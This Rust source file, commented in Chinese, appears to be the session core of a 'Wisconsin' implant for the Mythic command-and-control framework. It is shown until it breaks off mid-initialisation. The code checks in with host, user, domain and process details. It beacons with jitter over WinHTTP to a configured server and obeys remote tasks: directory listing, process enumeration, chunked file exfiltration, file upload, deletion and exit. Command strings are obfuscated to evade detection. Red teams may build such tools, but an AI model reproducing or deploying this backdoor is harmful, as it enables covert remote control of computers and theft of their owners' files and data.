// 负责首次握手,心跳轮询,Piggybacking等

use crate::ActiveStackWorkspace;
use crate::commands::file::{FileDownloadSession, FileReceiveSession};
use crate::error::{AgentError, WisconsinError, WisconsinResult};
use crate::profiles::crypto::CryptoContext;
use crate::profiles::http::HttpProfile;
use crate::protocol::{
    CheckinMessage, FileBrowserChildItem, FileDownloadResponse, FileUploadRequest,
    GetTaskingMessage, ProcessBrowserResponse, ProcessItem, ServerCheckinResponse,
    ServerTaskPostResponseItem, ServerTaskingResponseRef, TaskResponseItem,
};
use crate::sysinfo::SysInfoWorkspace;
use crate::transfer::TransferSession;
use obfstr::obfstr;

// ============ 结构化对象存储上限 ============
pub const MAX_FILES_PER_SLOT: usize = 32;
const MAX_PROCESSES_PER_SLOT: usize = 32;
const MAX_RESPONSE_SLOTS: usize = 16;

/// 空文件条目占位（用于 const 初始化）
const EMPTY_FILE_ENTRY: FileBrowserChildItem<'static> = FileBrowserChildItem::EMPTY;

/// 空进程条目占位（用于 const 初始化）
const EMPTY_PROC_ENTRY: ProcessItem<'static> = ProcessItem {
    process_id: 0,
    name: "",
    parent_process_id: None,
    architecture: None,
    bin_path: None,
    user: None,
    command_line: None,
    integrity_level: None,
    start_time: None,
    description: None,
    signer: None,
    protected_process_level: None,
};

pub use crate::commands::file::{ActiveDownload, ActiveUpload};

/// Agent 运行会话核心管理器 (Agent Session Manager)
pub struct AgentSession {
    crypto: CryptoContext,
    active_uuid: [u8; 36],
    is_registered: bool,
    should_exit: bool,
    sleep_interval: u64,
    sleep_jitter: u8,
    pub active_download: Option<ActiveDownload>,
    pub active_upload: Option<ActiveUpload>,
}

impl Drop for AgentSession {
    fn drop(&mut self) {
        crate::buffer::zeroize_slice(&mut self.active_uuid);
    }
}

impl AgentSession {
    pub fn new(master_key: &[u8; 32], payload_uuid: &[u8; 36]) -> WisconsinResult<Self> {
        let crypto = CryptoContext::new(master_key)?;
        let mut uuid_arr = [0u8; 36];
        uuid_arr.copy_from_slice(payload_uuid);

        Ok(Self {
            crypto,
            active_uuid: uuid_arr,
            is_registered: false,
            should_exit: false,
            sleep_interval: crate::config::AgentConfig::default_sleep_interval(),
            sleep_jitter: crate::config::AgentConfig::default_sleep_jitter(),
            active_download: None,
            active_upload: None,
        })
    }

    #[inline(always)]
    pub fn should_exit(&self) -> bool {
        self.should_exit
    }

    #[inline(always)]
    pub fn mark_exit(&mut self) {
        self.should_exit = true;
    }

    #[inline(always)]
    pub fn active_uuid_str(&self) -> &str {
        core::str::from_utf8(&self.active_uuid).unwrap_or("")
    }

    #[inline(always)]
    pub fn is_registered(&self) -> bool {
        self.is_registered
    }

    #[inline(always)]
    pub fn sleep_interval(&self) -> u64 {
        self.sleep_interval
    }

    #[inline(always)]
    pub fn sleep_jitter(&self) -> u8 {
        self.sleep_jitter
    }

    pub fn update_sleep(&mut self, interval: u64, jitter: u8) {
        self.sleep_interval = interval;
        self.sleep_jitter = jitter.min(100);
    }

    pub fn calculate_jittered_sleep(&self) -> u64 {
        if self.sleep_jitter == 0 || self.sleep_interval == 0 {
            return self.sleep_interval;
        }
        let delta_max = (self.sleep_interval * self.sleep_jitter as u64) / 100;
        if delta_max == 0 {
            return self.sleep_interval;
        }
        let rand_val = (rand::random::<u32>() as u64) % (delta_max * 2 + 1);
        self.sleep_interval
            .saturating_sub(delta_max)
            .saturating_add(rand_val)
    }

    pub fn interruptible_sleep(&self, seconds: u64) {
        use core::time::Duration;
        let total_ms = seconds.saturating_mul(1000);
        let mut elapsed_ms = 0;
        while elapsed_ms < total_ms && !self.should_exit && !crate::is_shutdown_requested() {
            let step = 100.min(total_ms - elapsed_ms);
            std::thread::sleep(Duration::from_millis(step));
            elapsed_ms += step;
        }
    }

    // ----------------- 核心通信握手阶段 -----------------

    pub fn build_checkin_payload(
        &self,
        workspace: &mut ActiveStackWorkspace,
        sysinfo_ws: &mut SysInfoWorkspace,
    ) -> WisconsinResult<usize> {
        let info = sysinfo_ws.collect()?;

        let mut checkin_msg = CheckinMessage::new(
            self.active_uuid_str(),
            info.ips.as_slice(),
            info.os,
            info.user,
            info.host,
            info.pid,
            info.architecture,
            info.domain,
        );
        checkin_msg = checkin_msg
            .with_integrity_level(info.integrity_level)
            .with_process_name(info.process_name);

        let http = HttpProfile::new("", "", self.active_uuid_str(), &self.crypto);
        let len = http.pack_message(&checkin_msg, &mut workspace.raw_buf, &mut workspace.b64_buf)?;
        Ok(len)
    }

    pub fn handle_checkin_response<'de>(
        &mut self,
        payload_b64: &[u8],
        raw_buf: &'de mut [u8],
    ) -> WisconsinResult<ServerCheckinResponse<'de>> {
        let http = HttpProfile::new("", "", self.active_uuid_str(), &self.crypto);
        let resp: ServerCheckinResponse<'de> = http.unpack_message(payload_b64, raw_buf)?;
        resp.validate()?;

        if let Some(new_id) = resp.id
            && new_id.len() == 36
        {
            self.active_uuid.copy_from_slice(new_id.as_bytes());
            self.is_registered = true;
        }
        Ok(resp)
    }

    pub fn build_get_tasking_payload(
        &self,
        responses: Option<&[TaskResponseItem<'_>]>,
        workspace: &mut ActiveStackWorkspace,
    ) -> WisconsinResult<usize> {
        if !self.is_registered {
            return Err(WisconsinError::Agent(AgentError::NotCheckedIn));
        }
        let mut msg = GetTaskingMessage::new(1);
        if let Some(resps) = responses {
            msg = msg.with_responses(resps);
        }
        let http = HttpProfile::new("", "", self.active_uuid_str(), &self.crypto);
        let len = http.pack_message(&msg, &mut workspace.raw_buf, &mut workspace.b64_buf)?;
        Ok(len)
    }

    pub fn parse_tasking_response<'de>(
        &self,
        payload_b64: &[u8],
        raw_buf: &'de mut [u8],
    ) -> WisconsinResult<ServerTaskingResponseRef<'de>> {
        let http = HttpProfile::new("", "", self.active_uuid_str(), &self.crypto);
        let resp: ServerTaskingResponseRef<'de> = http.unpack_message(payload_b64, raw_buf)?;
        if resp.action != obfstr!("get_tasking") {
            return Err(WisconsinError::Agent(AgentError::TransportFailed));
        }
        Ok(resp)
    }

    pub fn handle_builtin_command(&mut self, cmd: &str, params: &str) -> bool {
        if cmd == obfstr!("sleep") {
            let interval_str = if params.trim().starts_with('{') {
                extract_param(params, obfstr!("interval"))
            } else {
                params.split_whitespace().next().unwrap_or("")
            };
            if let Ok(sec) = interval_str.parse::<u64>() {
                let jitter_str = if params.trim().starts_with('{') {
                    extract_param(params, obfstr!("jitter"))
                } else {
                    params.split_whitespace().nth(1).unwrap_or("")
                };
                let jitter = jitter_str.parse::<u8>().ok().unwrap_or(self.sleep_jitter);
                self.update_sleep(sec, jitter);
                return true;
            }
        }
        false
    }

    /// 任务分发与执行中枢
    ///
    /// `ls` 与 `ps` 直接调用结构化上报接口，生成 Mythic UI 可渲染的
    /// `file_browser` / `processes` 对象，不再走纯文本 user_output。
    pub fn dispatch_task<'a>(
        &mut self,
        task: &crate::protocol::MythicTaskRef<'a>,
        exec_ws: &mut TaskExecutionWorkspace,
    ) {
        let cmd = task.command.trim();
        let params = task.parameters.trim();

        obfstr! {
            let cmd_sleep = "sleep";
            let cmd_exit = "exit";
            let cmd_pwd = "pwd";
            let cmd_cd = "cd";
            let cmd_whoami = "whoami";
            let cmd_ls = "ls";
            let cmd_ps = "ps";
            let cmd_download = "download";
            let cmd_upload = "upload";
            let cmd_rm = "rm";
        }

        if cmd == cmd_sleep {
            if self.handle_builtin_command(cmd, params) {
                exec_ws.record_response(task.id, obfstr!("sleep interval updated"), true, true);
            } else {
                exec_ws.record_response(task.id, obfstr!("invalid sleep parameters"), false, true);
            }
        } else if cmd == cmd_exit {
            self.mark_exit();
            exec_ws.record_response(task.id, obfstr!("agent exit signaled"), true, true);
        } else if cmd == cmd_pwd {
            #[cfg(windows)]
            {
                let mut dir_wbuf = [0u16; 260];
                let len = unsafe {
                    win32::GetCurrentDirectoryW(dir_wbuf.len() as u32, dir_wbuf.as_mut_ptr())
                };
                if len > 0 && (len as usize) < dir_wbuf.len() {
                    let mut utf8_buf = [0u8; 520];
                    let mut off = 0;
                    for ch in core::char::decode_utf16(dir_wbuf[..len as usize].iter().copied()) {
                        let c: char = ch.unwrap_or(core::char::REPLACEMENT_CHARACTER);
                        if off + c.len_utf8() <= utf8_buf.len() {
                            let s = c.encode_utf8(&mut utf8_buf[off..]);
                            off += s.len();
                        }
                    }
                    if let Ok(dir_str) = core::str::from_utf8(&utf8_buf[..off]) {
                        exec_ws.record_response(task.id, dir_str, true, true);
                    } else {
                        exec_ws.record_response(task.id, obfstr!("failed to decode directory path"), false, true);
                    }
                } else {
                    exec_ws.record_response(task.id, obfstr!("GetCurrentDirectory failed"), false, true);
                }
            }
            #[cfg(not(windows))]
            {
                exec_ws.record_response(task.id, obfstr!("/"), true, true);
            }
        } else if cmd == cmd_cd {
            #[cfg(windows)]
            {
                let path_param = extract_param(params, obfstr!("path"));
                if !path_param.is_empty() {
                    let mut wpath = [0u16; 260];
                    let mut wlen = 0;
                    for c in path_param.encode_utf16() {
                        if wlen < wpath.len() - 1 {
                            wpath[wlen] = c;
                            wlen += 1;
                        }
                    }
                    wpath[wlen] = 0;
                    let ok = unsafe { win32::SetCurrentDirectoryW(wpath.as_ptr()) };
                    if ok != 0 {
                        exec_ws.record_response(task.id, obfstr!("directory changed"), true, true);
                    } else {
                        exec_ws.record_response(task.id, obfstr!("SetCurrentDirectory failed"), false, true);
                    }
                } else {
                    exec_ws.record_response(task.id, obfstr!("invalid path argument"), false, true);
                }
            }
            #[cfg(not(windows))]
            {
                exec_ws.record_response(task.id, obfstr!("directory changed"), true, true);
            }
        } else if cmd == cmd_whoami {
            let mut sys_ws = SysInfoWorkspace::new();
            if let Ok(info) = sys_ws.collect() {
                let mut out_buf = [0u8; 256];
                let mut off = 0;
                let dom = info.domain.as_bytes();
                let usr = info.user.as_bytes();
                if !dom.is_empty() {
                    if off + dom.len() + 1 + usr.len() < out_buf.len() {
                        out_buf[off..off + dom.len()].copy_from_slice(dom);
                        off += dom.len();
                        out_buf[off] = b'\\';
                        off += 1;
                        out_buf[off..off + usr.len()].copy_from_slice(usr);
                        off += usr.len();
                    }
                } else if off + usr.len() < out_buf.len() {
                    out_buf[off..off + usr.len()].copy_from_slice(usr);
                    off += usr.len();
                }
                if let Ok(whoami_str) = core::str::from_utf8(&out_buf[..off]) {
                    exec_ws.record_response(task.id, whoami_str, true, true);
                } else {
                    exec_ws.record_response(task.id, obfstr!("failed to format whoami output"), false, true);
                }
            } else {
                exec_ws.record_response(task.id, obfstr!("sysinfo collection failed"), false, true);
            }
        } else if cmd == cmd_ls {
            // ====== 结构化 file_browser 上报 ======
            let path_param = extract_param(params, obfstr!("path"));
            obfstr!(let dot = ".";);
            let target_path = if path_param.is_empty() { dot } else { path_param };
            crate::commands::file::execute_ls(task.id, target_path, exec_ws);
        } else if cmd == cmd_ps {
            // ====== 结构化 processes 上报（通过 CreateToolhelp32Snapshot 枚举系统进程） ======
            self.emit_process_browser(task.id, exec_ws);
        } else if cmd == cmd_download {
            crate::commands::file::execute_download(
                task.id,
                params,
                exec_ws,
                &mut self.active_download,
            );
        } else if cmd == cmd_upload {
            crate::commands::file::execute_upload(
                task.id,
                params,
                exec_ws,
                &mut self.active_upload,
            );
        } else if cmd == cmd_rm {
            crate::commands::file::execute_rm(task.id, params, exec_ws);
        } else {
            exec_ws.record_response(task.id, obfstr!("command not implemented"), false, true);
        }
    }

    /// 枚举目录并生成结构化 file_browser 上报 (委托至 commands::file::execute_ls)
    #[inline]
    pub fn emit_file_browser(
        &self,
        task_id: &str,
        target_path: &str,
        exec_ws: &mut TaskExecutionWorkspace,
    ) {
        crate::commands::file::execute_ls(task_id, target_path, exec_ws);
    }

    /// 枚举进程并生成结构化 processes 上报
    ///
    /// Windows 下走 `CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS)` 获取系统
    /// 实际进程列表（PID / PPID / 进程名），非 Windows 下用当前进程占位。
    fn emit_process_browser(&self, task_id: &str, exec_ws: &mut TaskExecutionWorkspace) {
        let mut host_buf = [0u8; 260];
        let host_len = {
            let mut sys_ws = SysInfoWorkspace::new();
            match sys_ws.collect() {
                Ok(info) => {
                    let n = info.host.len().min(host_buf.len());
                    host_buf[..n].copy_from_slice(&info.host.as_bytes()[..n]);
                    n
                }
                Err(_) => 0,
            }
        };
        let host = core::str::from_utf8(&host_buf[..host_len]).unwrap_or("");

        let mut names_buf = [[0u8; 260]; MAX_PROCESSES_PER_SLOT];
        let mut names_len = [0usize; MAX_PROCESSES_PER_SLOT];
        let mut pids = [0u32; MAX_PROCESSES_PER_SLOT];
        let mut ppids = [0u32; MAX_PROCESSES_PER_SLOT];
        let mut count = 0usize;

        #[cfg(windows)]
        {
            use win32::{PROCESSENTRY32W, INVALID_HANDLE_VALUE, TH32CS_SNAPPROCESS};

            let snap = unsafe { win32::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };
            if snap != INVALID_HANDLE_VALUE {
                let mut pe: PROCESSENTRY32W = unsafe { core::mem::zeroed() };
                pe.dwSize = core::mem::size_of::<PROCESSENTRY32W>() as u32;
                let mut ok = unsafe { win32::Process32FirstW(snap, &mut pe) };
                while ok != 0 && count < MAX_PROCESSES_PER_SLOT {
                    let mut n_len = 0;
                    let zero_pos = pe
                        .szExeFile
                        .iter()
                        .position(|&w| w == 0)
                        .unwrap_or(pe.szExeFile.len());
                    for ch in core::char::decode_utf16(pe.szExeFile[..zero_pos].iter().copied()) {
                        let c = ch.unwrap_or(core::char::REPLACEMENT_CHARACTER);
                        if n_len + c.len_utf8() <= names_buf[count].len() {
                            let s = c.encode_utf8(&mut names_buf[count][n_len..]);
                            n_len += s.len();
                        }
                    }
                    names_len[count] = n_len;
                    pids[count] = pe.th32ProcessID;
                    ppids[count] = pe.th32ParentProcessID;
                    count += 1;

                    pe.dwSize = core::mem::size_of::<PROCESSENTRY32W>() as u32;
                    ok = unsafe { win32::Process32NextW(snap, &mut pe) };
                }
                unsafe {
                    win32::CloseHandle(snap);
                }
            }
        }
        #[cfg(not(windows))]
        {
            let cur_name = b"wisconsin";
            names_buf[0][..cur_name.len()].copy_from_slice(cur_name);
            names_len[0] = cur_name.len();
            pids[0] = std::process::id();
            ppids[0] = 0;
            count = 1;
        }

        exec_ws.record_process_response_from_parts(
            task_id,
            if host_len == 0 { None } else { Some(host) },
            obfstr!("windows"),
            false,
            &names_buf[..count],
            &names_len[..count],
            &pids[..count],
            &ppids[..count],
        );
    }

    pub fn handle_server_post_responses(
        &mut self,
        responses: &[ServerTaskPostResponseItem<'_>],
    ) {
        for resp in responses {
            if let Some(ref mut dl) = self.active_download
                && resp.task_id == dl.task_id_str()
            {
                if !dl.is_registered {
                    let mut sess = TransferSession::new(dl.task_id_str(), dl.total_size);
                    if let Ok(id_str) = sess.handle_register_ack(resp) {
                        let mut arr = [0u8; 36];
                        arr.copy_from_slice(id_str.as_bytes());
                        dl.file_id = Some(arr);
                        dl.is_registered = true;
                    }
                } else if resp.chunk_offset.is_some() {
                    let mut sess = TransferSession::new_with_transfer_id(
                        dl.task_id_str(),
                        dl.total_size,
                        dl.file_id.unwrap_or([0u8; 36]),
                        dl.current_offset,
                    );
                    if let Ok(new_offset) = sess.handle_chunk_ack(resp) {
                        dl.current_offset = new_offset;
                        dl.is_complete = dl.total_size >= 0 && dl.current_offset >= dl.total_size as u64;
                    }
                }
            }

            if let Some(ref mut ul) = self.active_upload {
                let task_id_arr = ul.task_id;
                let task_id_len = ul.task_id_len;
                let task_id_str = core::str::from_utf8(&task_id_arr[..task_id_len]).unwrap_or("");
                if resp.task_id == task_id_str && let Some(chunk_data_b64) = resp.chunk_data {
                    let file_id_arr = ul.file_id;
                    let file_id_len = ul.file_id_len;
                    let file_id_str = core::str::from_utf8(&file_id_arr[..file_id_len]).unwrap_or("");
                    let path_arr = ul.path_buf;
                    let path_len = ul.path_len;
                    let path_str = core::str::from_utf8(&path_arr[..path_len]).unwrap_or("");

                    if let Ok(mut recv_sess) = FileReceiveSession::new(
                        task_id_str,
                        file_id_str,
                        ul.chunk_size,
                        Some(path_str),
                    ) {
                        recv_sess.session.current_chunk_num = ul.current_chunk_num;
                        recv_sess.session.total_chunks = ul.total_chunks;

                        let chunk_n = resp.chunk_num.unwrap_or(ul.current_chunk_num);
                        let mut decode_buf = [0u8; crate::BUFFER_SIZE];
                        let total_c = resp.total_chunks.unwrap_or(ul.total_chunks);

                        #[cfg(windows)]
                        {
                            let file_res = if chunk_n <= 1 {
                                crate::stream::NativeFileHandle::open_write_truncate(path_str)
                            } else {
                                crate::stream::NativeFileHandle::open_write_append(path_str)
                            };

                            if let Ok(mut file) = file_res {
                                if let Ok(_written) = recv_sess.session.write_incoming_chunk(
                                    chunk_data_b64,
                                    total_c,
                                    chunk_n,
                                    &mut decode_buf,
                                    &mut file,
                                ) {
                                    ul.current_chunk_num = recv_sess.session.current_chunk_num;
                                    ul.total_chunks = recv_sess.session.total_chunks;
                                    ul.is_complete = recv_sess.session.is_complete;
                                }
                            }
                        }

                        #[cfg(not(windows))]
                        {
                            let mut open_opts = std::fs::OpenOptions::new();
                            open_opts.create(true).write(true);
                            if chunk_n <= 1 {
                                open_opts.truncate(true);
                            } else {
                                open_opts.append(true);
                            }

                            if let Ok(mut file) = open_opts.open(path_str) {
                                if let Ok(_written) = recv_sess.session.write_incoming_chunk(
                                    chunk_data_b64,
                                    total_c,
                                    chunk_n,
                                    &mut decode_buf,
                                    &mut file,
                                ) {
                                    ul.current_chunk_num = recv_sess.session.current_chunk_num;
                                    ul.total_chunks = recv_sess.session.total_chunks;
                                    ul.is_complete = recv_sess.session.is_complete;
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    pub fn step_file_transfers(
        &mut self,
        exec_ws: &mut TaskExecutionWorkspace,
        workspace: &mut ActiveStackWorkspace,
    ) {
        if let Some(mut dl) = self.active_download
            && dl.is_registered
            && !dl.is_complete
            && let Some(file_id) = dl.file_id
        {
            let task_id_arr = dl.task_id;
            let task_id_len = dl.task_id_len;
            let task_id = core::str::from_utf8(&task_id_arr[..task_id_len]).unwrap_or("");
            let path_arr = dl.path_buf;
            let path_len = dl.path_len;
            let path = core::str::from_utf8(&path_arr[..path_len]).unwrap_or("");
            let filename = extract_filename(path);
            let mut sess = FileDownloadSession::new_with_file_id(
                task_id,
                Some(path),
                Some(filename),
                dl.total_size,
                file_id,
                dl.current_offset,
            );

            #[cfg(windows)]
            let file_source = crate::stream::NativeFileHandle::open_read(path);
            #[cfg(not(windows))]
            let file_source = std::fs::File::open(path);

            if let Ok(mut file) = file_source {
                match sess.read_next_chunk_file(&mut file, workspace, true) {
                    Ok((chunk_resp, read_bytes)) => {
                        dl.current_offset = dl.current_offset.saturating_add(read_bytes as u64);
                        dl.is_complete = dl.total_size >= 0 && dl.current_offset >= dl.total_size as u64;

                        let completed = dl.is_complete;
                        obfstr! {
                            let msg_completed = "file download completed";
                            let msg_streaming = "streaming chunk";
                        }
                        let user_msg = if completed { msg_completed } else { msg_streaming };

                        exec_ws.record_download_response(
                            task_id,
                            chunk_resp,
                            user_msg,
                            true,
                            completed,
                        );

                        if completed {
                            self.active_download = None;
                        } else {
                            self.active_download = Some(dl);
                        }
                    }
                    Err(_) => {
                        exec_ws.record_response(task_id, obfstr!("failed to pump file chunk"), false, true);
                        self.active_download = None;
                    }
                }
            } else {
                exec_ws.record_response(task_id, obfstr!("failed to open file for streaming"), false, true);
                self.active_download = None;
            }
        }

        if let Some(ul) = self.active_upload {
            if !ul.is_complete {
                let task_id = ul.task_id_str();
                let file_id = ul.file_id_str();
                let path = ul.path_str();

                if let Ok(recv_sess) = FileReceiveSession::new(
                    task_id,
                    file_id,
                    ul.chunk_size,
                    Some(path),
                ) {
                    let mut sess = recv_sess.session;
                    sess.current_chunk_num = ul.current_chunk_num;
                    sess.total_chunks = ul.total_chunks;
                    let req = sess.build_chunk_request();
                    exec_ws.record_upload_response(task_id, req, obfstr!("requesting next chunk"), true, false);
                }
            } else {
                exec_ws.record_response(ul.task_id_str(), obfstr!("file upload completed"), true, true);
                self.active_upload = None;
            }
        }
    }

    #[cfg(windows)]
    pub fn run(&mut self) {
        use crate::profiles::http::winhttp::WinHttpTransport;
        use crate::protocol::StackVec;

        crate::config_server_host!(server_host);
        crate::config_post_uri!(post_uri);
        crate::config_user_agent!(user_agent);
        let server_port = crate::config::AgentConfig::server_port();
        let is_https = crate::config::AgentConfig::is_https();

        let transport = match WinHttpTransport::new(server_host, server_port, is_https, user_agent) {
            Ok(t) => t,
            Err(_) => return,
        };

        let mut workspace = ActiveStackWorkspace::new();
        let mut sysinfo_ws = SysInfoWorkspace::new();
        let mut exec_ws = TaskExecutionWorkspace::new();
        let mut server_resp_buf = [0u8; crate::MAX_B64_LEN];

        // 1. 上线注册循环
        while !self.is_registered && !self.should_exit && !crate::is_shutdown_requested() {
            if let Ok(b64_len) = self.build_checkin_payload(&mut workspace, &mut sysinfo_ws)
                && let Ok(recv_len) = transport.post_exchange(post_uri, &workspace.b64_buf[..b64_len], &mut server_resp_buf)
            {
                let _ = self.handle_checkin_response(&server_resp_buf[..recv_len], &mut workspace.raw_buf);
            }

            if !self.is_registered {
                let sleep_secs = self.calculate_jittered_sleep();
                self.interruptible_sleep(sleep_secs);
            }
        }

        // 2. 常态心跳与任务调度循环
        while !self.should_exit && !crate::is_shutdown_requested() {
            self.step_file_transfers(&mut exec_ws, &mut workspace);

            let b64_len_res = {
                let mut resp_items = StackVec::<TaskResponseItem<'_>, 16>::new();
                exec_ws.build_items(&mut resp_items);

                let piggybacked = if resp_items.is_empty() {
                    None
                } else {
                    Some(resp_items.as_slice())
                };

                self.build_get_tasking_payload(piggybacked, &mut workspace)
            };

            if let Ok(b64_len) = b64_len_res
                && let Ok(recv_len) = transport.post_exchange(post_uri, &workspace.b64_buf[..b64_len], &mut server_resp_buf)
            {
                // ★ 关键修复：只有在服务端响应成功解析并通过校验之后，才清理本轮的已交付回执。
                //   若 parse_tasking_response 返回 Err（服务端返回非法/无法解密报文），
                //   则保留 exec_ws 中的回执数据，等待下一次心跳重试，避免“投递成功但回执永久丢失”。
                if let Ok(task_resp) = self.parse_tasking_response(&server_resp_buf[..recv_len], &mut workspace.raw_buf) {
                    // 解析成功，此时本轮已发送出去的回执可以被安全清除
                    exec_ws.clear();

                    if let Some(ref responses) = task_resp.responses {
                        self.handle_server_post_responses(responses.as_slice());
                    }
                    for task in &task_resp.tasks {
                        self.dispatch_task(task, &mut exec_ws);
                    }
                }
                // 解析失败：不清除 exec_ws，回执保留到下一次心跳继续捎带重试
            }

            // 关闭 / 卸载时的最后一次原子外发回传
            if (self.should_exit || crate::is_shutdown_requested()) && !exec_ws.is_empty() {
                let mut resp_items = StackVec::<TaskResponseItem<'_>, 16>::new();
                exec_ws.build_items(&mut resp_items);
                if !resp_items.is_empty() {
                    if let Ok(b64_len) = self.build_get_tasking_payload(Some(resp_items.as_slice()), &mut workspace) {
                        let _ = transport.post_exchange(post_uri, &workspace.b64_buf[..b64_len], &mut server_resp_buf);
                    }
                }
                break;
            }

            let sleep_secs = self.calculate_jittered_sleep();
            self.interruptible_sleep(sleep_secs);
        }
    }

    #[cfg(not(windows))]
    pub fn run(&mut self) {
        // 非 Windows 环境占位实现
    }
}

/// 零堆提取参数字段（兼容 Mythic UI 模态框下发的 JSON 格式与 CLI 原生传参）
#[inline]
pub fn extract_param<'a>(raw: &'a str, key: &str) -> &'a str {
    let trimmed = raw.trim();
    if !trimmed.starts_with('{') {
        return trimmed.trim_matches('"');
    }
    let key_bytes = key.as_bytes();
    let bytes = trimmed.as_bytes();
    let mut search_start = 0;

    while let Some(pos) = trimmed[search_start..].find(key) {
        let abs_pos = search_start + pos;
        let before_ok = abs_pos > 0 && bytes[abs_pos - 1] == b'"';
        let after_pos = abs_pos + key_bytes.len();
        let after_quote_ok = after_pos < bytes.len() && bytes[after_pos] == b'"';

        if before_ok && after_quote_ok {
            let rest = &trimmed[after_pos + 1..];
            let trimmed_rest = rest.trim_start();
            if let Some(after_colon) = trimmed_rest.strip_prefix(':') {
                let val_str = after_colon.trim_start();
                if let Some(inside) = val_str.strip_prefix('"') {
                    let val_bytes = inside.as_bytes();
                    let mut i = 0;
                    while i < val_bytes.len() {
                        if val_bytes[i] == b'"' {
                            let mut bs_count = 0;
                            let mut j = i;
                            while j > 0 && val_bytes[j - 1] == b'\\' {
                                bs_count += 1;
                                j -= 1;
                            }
                            if bs_count % 2 == 0 {
                                return &inside[..i];
                            }
                        }
                        i += 1;
                    }
                    return inside;
                } else {
                    let end = val_str
                        .find(|c: char| c == ',' || c == '}' || c.is_whitespace())
                        .unwrap_or(val_str.len());
                    return &val_str[..end];
                }
            }
        }
        search_start = abs_pos + 1;
    }
    ""
}

pub use crate::commands::file::extract_filename;

/// 单项下载元数据存储暂存
#[derive(Clone, Copy)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct DownloadItemMeta {
    pub is_set: bool,
    pub total_size: Option<i64>,
    pub file_id: [u8; 36],
    pub file_id_len: usize,
    pub chunk_offset: Option<u64>,
    pub chunk_data_offset: usize,
    pub chunk_data_len: usize,
    pub full_path_offset: usize,
    pub full_path_len: usize,
    pub filename_offset: usize,
    pub filename_len: usize,
    pub is_screenshot: Option<bool>,
    pub resume: Option<bool>,
}

impl DownloadItemMeta {
    pub const fn new() -> Self {
        Self {
            is_set: false,
            total_size: None,
            file_id: [0u8; 36],
            file_id_len: 0,
            chunk_offset: None,
            chunk_data_offset: 0,
            chunk_data_len: 0,
            full_path_offset: 0,
            full_path_len: 0,
            filename_offset: 0,
            filename_len: 0,
            is_screenshot: None,
            resume: None,
        }
    }
}

impl Default for DownloadItemMeta {
    fn default() -> Self {
        Self::new()
    }
}

/// 单项上传元数据存储暂存
#[derive(Clone, Copy)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct UploadItemMeta {
    pub is_set: bool,
    pub chunk_size: u32,
    pub file_id: [u8; 36],
    pub file_id_len: usize,
    pub chunk_num: u32,
    pub full_path_offset: usize,
    pub full_path_len: usize,
}

impl UploadItemMeta {
    pub const fn new() -> Self {
        Self {
            is_set: false,
            chunk_size: 0,
            file_id: [0u8; 36],
            file_id_len: 0,
            chunk_num: 0,
            full_path_offset: 0,
            full_path_len: 0,
        }
    }
}

impl Default for UploadItemMeta {
    fn default() -> Self {
        Self::new()
    }
}

/// 文件浏览器槽的元数据（不含借用，仅偏移）
#[derive(Clone, Copy)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
struct FileBrowserMeta {
    pub is_set: bool,
    pub is_file: bool,
    pub success: bool,
    pub access_time: u64,
    pub modify_time: u64,
    pub size: u64,
    pub name_offset: usize,
    pub name_len: usize,
    pub parent_path_offset: usize,
    pub parent_path_len: usize,
    pub file_count: usize,
}

impl FileBrowserMeta {
    const fn new() -> Self {
        Self {
            is_set: false,
            is_file: false,
            success: false,
            access_time: 0,
            modify_time: 0,
            size: 0,
            name_offset: 0,
            name_len: 0,
            parent_path_offset: 0,
            parent_path_len: 0,
            file_count: 0,
        }
    }
}

/// 进程浏览器槽的元数据（不含借用，仅偏移）
#[derive(Clone, Copy)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
struct ProcessBrowserMeta {
    pub is_set: bool,
    pub update_deleted: bool,
    pub host_offset: usize,
    pub host_len: usize,
    pub os_offset: usize,
    pub os_len: usize,
    pub process_count: usize,
}

impl ProcessBrowserMeta {
    const fn new() -> Self {
        Self {
            is_set: false,
            update_deleted: false,
            host_offset: 0,
            host_len: 0,
            os_offset: 0,
            os_len: 0,
            process_count: 0,
        }
    }
}

/// 任务执行回显与状态暂存工作区 (Zero-Heap Task Execution Workspace)
///
/// `file_entries_cache` / `proc_entries_cache` 是持久缓存，用于让
/// `build_items(&'a self)` 返回真正的 `&'a [Entry<'a>]` 切片，
/// 内部引用的实际指向是 `self.output_buf` 内的字节区，生命周期与 `self` 一致。
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct TaskExecutionWorkspace {
    output_buf: [u8; 16384],
    output_len: usize,
    output_offsets: [usize; MAX_RESPONSE_SLOTS],
    output_lens: [usize; MAX_RESPONSE_SLOTS],
    task_ids: [[u8; 36]; MAX_RESPONSE_SLOTS],
    task_id_lens: [usize; MAX_RESPONSE_SLOTS],
    is_success: [bool; MAX_RESPONSE_SLOTS],
    is_completed: [bool; MAX_RESPONSE_SLOTS],
    download_metas: [DownloadItemMeta; MAX_RESPONSE_SLOTS],
    upload_metas: [UploadItemMeta; MAX_RESPONSE_SLOTS],
    file_browser_metas: [FileBrowserMeta; MAX_RESPONSE_SLOTS],
    process_metas: [ProcessBrowserMeta; MAX_RESPONSE_SLOTS],
    file_entries_cache: [FileBrowserChildItem<'static>; MAX_FILES_PER_SLOT],
    file_browser_slot: Option<usize>,
    proc_entries_cache: [ProcessItem<'static>; MAX_PROCESSES_PER_SLOT],
    proc_browser_slot: Option<usize>,
    count: usize,
}

impl Drop for TaskExecutionWorkspace {
    fn drop(&mut self) {
        crate::buffer::zeroize_slice(&mut self.output_buf);
    }
}

impl Default for TaskExecutionWorkspace {
    fn default() -> Self {
        Self::new()
    }
}

impl TaskExecutionWorkspace {
    pub const fn new() -> Self {
        Self {
            output_buf: [0u8; 16384],
            output_len: 0,
            output_offsets: [0usize; MAX_RESPONSE_SLOTS],
            output_lens: [0usize; MAX_RESPONSE_SLOTS],
            task_ids: [[0u8; 36]; MAX_RESPONSE_SLOTS],
            task_id_lens: [0usize; MAX_RESPONSE_SLOTS],
            is_success: [false; MAX_RESPONSE_SLOTS],
            is_completed: [false; MAX_RESPONSE_SLOTS],
            download_metas: [DownloadItemMeta::new(); MAX_RESPONSE_SLOTS],
